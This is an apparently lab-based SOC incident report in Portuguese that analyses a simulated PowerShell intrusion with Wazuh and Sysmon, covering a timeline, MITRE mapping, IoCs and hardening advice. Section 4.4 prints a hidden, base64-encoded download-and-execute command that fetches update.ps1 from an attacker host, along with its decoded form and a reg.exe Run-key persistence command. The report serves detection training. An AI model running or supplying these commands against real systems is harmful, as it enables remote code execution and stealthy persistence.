# 🛡️ Relatório Técnico de Investigação de Incidente — SOC N1

**ID do Caso:** `INC-2026-1116-001`  
**Analista Responsável:** Analista SOC N1  
**Data da Investigação:** 16 de Novembro de 2026  
**Severidade Classificada:** Alta (Nível 10 — Wazuh SIEM)  
**Status do Incidente:** Contido / Erradicado (Ambiente restaurado via Snapshot limpo)  

---

## 1. Resumo Executivo

Durante o monitoramento contínuo de eventos de segurança no ambiente Windows 11 (`WIN11-SOC-LAB`), o SIEM **Wazuh** (integrado à telemetria do **Sysmon**) disparou um alerta de alta severidade (**Regra `92041` — Nível 10**) indicando a modificação suspeita de uma chave de inicialização do Registro do Windows originada a partir de uma instância ofuscada do PowerShell.

A triagem e a correlação temporal dos logs confirmaram tratar-se de um **incidente verdadeiro positivo** envolvendo execução *fileless* (em memória) via PowerShell codificado em Base64, download de payload remoto (`update.ps1`) a partir de um servidor externo (C2/Staging), enumeração de privilégios locais e estabelecimento de persistência via chave `Run` no registro do usuário.

---

## 2. Escopo e Ativos Afetados

| Atributo | Detalhes do Ativo Comprometido | Detalhes da Origem Maliciosa (Atacante/C2) |
| :--- | :--- | :--- |
| **Hostname / Identificador** | `DESKTOP-N4S0DR0` (`WIN11-SOC-LAB` / Agent ID `001`) | Servidor Externo / Kali Linux (`soc-lab`) |
| **Endereço IP** | `192.168.123.131` | `192.168.123.128` |
| **Sistema Operacional** | Microsoft Windows 11 (Build `10.0.26100.7019`) | Kali Linux (Host C2 HTTP na porta `8080`) |
| **Conta de Usuário Afetada** | `DESKTOP-N4S0DR0\analista` (Integridade: *Medium*) | N/A |
| **Sensores de Telemetria** | Wazuh Agent `v4.14.x` + Sysmon (`Operational`) | Logs de Acesso HTTP (`python3 -m http.server`) |

---

## 3. Linha do Tempo do Incidente (Kill Chain)

Todos os horários abaixo estão normalizados conforme os logs do Wazuh Dashboard e registros do servidor de entrega:

* **`18:13:14` – `18:13:39` (Ruído / Baseline):** Execuções periódicas legítimas do utilitário `SecEdit.exe` disparadas pelo módulo SCA (*Security Configuration Assessment*) do próprio agente Wazuh (descartadas na triagem inicial).
* **`18:20:32` (Tentativa Inicial de Conexão C2):** O host `192.168.123.131` realiza quatro tentativas de conexão TLS/HTTPS contra o servidor atacante na porta `8080`, resultando em erro `HTTP 400 (Bad request version)` devido à ausência de certificado SSL no servidor de staging.
* **`18:22:50` (Entrega de Payload — Ingress Tool Transfer):** O host comprometido estabelece conexão HTTP bem-sucedida (`GET /update.ps1 HTTP/1.1 200`) e baixa o script malicioso diretamente para a memória via `Net.WebClient`.
* **`18:22:53` (Descoberta e Enumeração Local):** O processo pai `powershell.exe` executa comandos nativos de reconhecimento do sistema e de grupos administrativos (`net.exe localgroup administrators`, `whoami.exe`, `systeminfo.exe`), acionando a regra Wazuh `92033`.
* **`18:22:58` (Estabelecimento de Persistência):** O PowerShell ofuscado invoca o binário `reg.exe` para gravar a entrada `WindowsSecurityHealth` na chave `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, acionando o alerta crítico **Wazuh `92041` (Nível 10)**.

---

## 4. Análise Técnica e Evidências Forenses

### 4.1. Triagem Inicial e Descarte de Falsos Positivos
Ao filtrar eventos de criação de processo (`Sysmon Event ID 1`) gerados pelo PowerShell no host `WIN11-SOC-LAB`, foram identificados 13 eventos. Os 10 registros ocorridos às `18:13` (`rule.id: 92066`) foram analisados e descartados como **falsos positivos operacionais**, pois correspondiam à rotina interna do Wazuh executando `secedit /export /cfg $env:TEMP\secpol.cfg` para auditoria de políticas de bloqueio de conta.

> 📸 **Evidência Visual 1:** Visão geral da triagem no Wazuh Threat Hunting separando os 3 eventos reais do ataque (`18:22`) do ruído de auditoria (`18:13`).  
> `![Visão Geral Threat Hunting](assets/print1.png)`

---

### 4.2. Entrega de Payload Remoto (C2 / Staging)
Os registros do servidor HTTP atacante confirmaram o download do estágio secundário (`update.ps1`) pelo IP da vítima (`192.168.123.131`) exatamente 3 segundos antes do início das atividades de descoberta no endpoint.

```text
192.168.123.131 - - [16/Nov/2026 18:22:50] "GET /update.ps1 HTTP/1.1" 200 -
```

> 📸 **Evidência Visual 2:** Requisição HTTP `200 OK` demonstrando a transferência do script `update.ps1` para a máquina vítima.  
> `![Servidor HTTP C2](assets/c2_http_log.png)`

---

### 4.3. Descoberta do Ambiente (Discovery)
Após carregar o script em memória via `IEX (Invoke-Expression)`, o atacante realizou enumeração de contas privilegiadas no host local utilizando o binário nativo `net.exe` (LOLBin):

* **Regra Wazuh:** `92033` — *Discovery activity spawned via powershell execution* (Nível `3`)
* **Processo Executado:** `C:\Windows\System32\net.exe` (`PID` filho de `powershell.exe`)
* **Linha de Comando:** `"C:\WINDOWS\system32\net.exe" localgroup administrators`

> 📸 **Evidência Visual 3:** Detalhes do Sysmon Event ID 1 capturando a enumeração de administradores locais.  
> `![Enumeração Local](assets/print3.png)`

---

### 4.4. Execução Ofuscada e Persistência no Registro
A etapa mais crítica da cadeia ocorreu às `18:22:58`, quando a instância oculta do PowerShell executou o utilitário `reg.exe` para garantir sobrevivência após reinicialização do sistema:

* **Regra Wazuh:** `92041` — *Value added to registry key has Base64-like pattern* (Nível `10`)
* **Processo Pai (`ParentImage`):** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` (`PID: 1336`)
* **Linha de Comando Pai (`ParentCommandLine`):**
  ```powershell
  powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMgAzAC4AMQAyADgAOgA4ADAAOAAwAC8AdQBwAGQAYQB0AGUALgBwAHMAMQAnACkA
  ```
* **Payload Decodificado (UTF-16LE):**
  ```powershell
  IEX (New-Object Net.WebClient).DownloadString('http://192.168.123.128:8080/update.ps1')
  ```
* **Processo Filho (`Image`):** `C:\Windows\System32\reg.exe` (`PID: 8460`)
* **Comando de Persistência Executado:**
  ```cmd
  "C:\WINDOWS\system32\reg.exe" add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsSecurityHealth /t REG_SZ /d "powershell.exe -WindowStyle Hidden -Command echo Compromised" /f
  ```

> 📸 **Evidências Visuais 4, 5 e 6:** Detalhamento forense do alerta `92041` exibindo a linha de comando do registro, a árvore de processos com o payload Base64 e o mapeamento MITRE ATT&CK.  
> `![Persistência Registro](assets/print2.1.png)`  
> `![Árvore de Processos Base64](assets/print2.2.png)`  
> `![Mapeamento MITRE](assets/print2.3.png)`

---

## 5. Mapeamento MITRE ATT&CK®

| Tática | Técnica | ID MITRE | Evidência Observada no Ambiente |
| :--- | :--- | :--- | :--- |
| **Execution** | Command and Scripting Interpreter: PowerShell | `T1059.001` | Execução de `powershell.exe` com flags `-NoP -NonI -W Hidden -Enc` e `IEX`. |
| **Defense Evasion** | Obfuscated Files or Information | `T1027` | Payload codificado em Base64 (UTF-16LE) para evadir detecção baseada em string simples. |
| **Command and Control** | Ingress Tool Transfer | `T1105` | Download remoto do arquivo `update.ps1` via HTTP (`porta 8080`) a partir de `192.168.123.128`. |
| **Discovery** | Permission Groups Discovery: Local Groups | `T1069.001` | Execução de `net.exe localgroup administrators` gerada pelo processo PowerShell. |
| **Persistence** | Boot or Logon Autostart Execution: Registry Run Keys | `T1547.001` | Criação do valor `WindowsSecurityHealth` em `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`. |
| **Defense Evasion** | Modify Registry | `T1112` | Uso direto de `reg.exe add` para alterar chaves de configuração do usuário. |

---

## 6. Indicadores de Comprometimento (IoCs)

| Tipo de IoC | Valor | Contexto / Observação |
| :--- | :--- | :--- |
| **Endereço IPv4 (C2)** | `192.168.123.128` | Servidor HTTP hospedando o payload na porta TCP `8080`. |
| **URL Maliciosa** | `http://192.168.123.128:8080/update.ps1` | Estágio secundário baixado via `Net.WebClient`. |
| **Chave de Registro** | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSecurityHealth` | Mecanismo de persistência masquerading como serviço de segurança do Windows. |
| **Hash MD5 (`reg.exe`)** | `F6E3559DDDDCCC843A12CFD50178C554` | Binário legítimo utilizado via LOLBAS para gravação no registro. |
| **Hash SHA256 (`reg.exe`)** | `EF37663B44AC66920C6F33694DEEA01ACB78AE3F3012884819373FA04C3EB5F0` | Hash do processo filho registrado pelo Sysmon (`Event ID 1`). |
| **Hash SHA256 (`net.exe`)** | `BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777` | Hash do binário utilizado na etapa de descoberta de grupos locais. |

---

## 7. Ações de Contenção, Erradicação e Recomendações

### Ações Executadas (Resposta Imediata)
1. **Isolamento e Contenção:** Bloqueio da comunicação de saída do endpoint `192.168.123.131` para o IP malicioso `192.168.123.128` e encerramento do servidor de staging.
2. **Erradicação:** Remoção da chave de persistência `WindowsSecurityHealth` em `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` e restauração da máquina virtual para o snapshot íntegro pré-incidente.

### Recomendações de Melhoria (Hardening & Detecção)
* **Restrição de PowerShell (Constrained Language Mode / AppLocker):** Restringir a execução de `powershell.exe` para usuários padrão não administrativos e habilitar o **PowerShell Script Block Logging (Event ID 4104)** para visibilidade completa de scripts decodificados em memória.
* **Tuning de Regras SIEM (Wazuh):** Criar uma regra filha personalizada no Wazuh (`local_rules.xml`) elevando para **Nível 12** qualquer execução do Sysmon Event ID 1 contendo parâmetros `-Enc` ou `-EncodedCommand` invocados a partir de processos interativos (`cmd.exe`, `explorer.exe`), gerando disparo imediato de resposta ativa (*Active Response*).
* **Egress Filtering:** Bloquear conexões HTTP/HTTPS de saída em portas não padronizadas (`8080`, `4444`, `8000`) diretamente nos firewalls de borda e host para estações de trabalho corporativas.
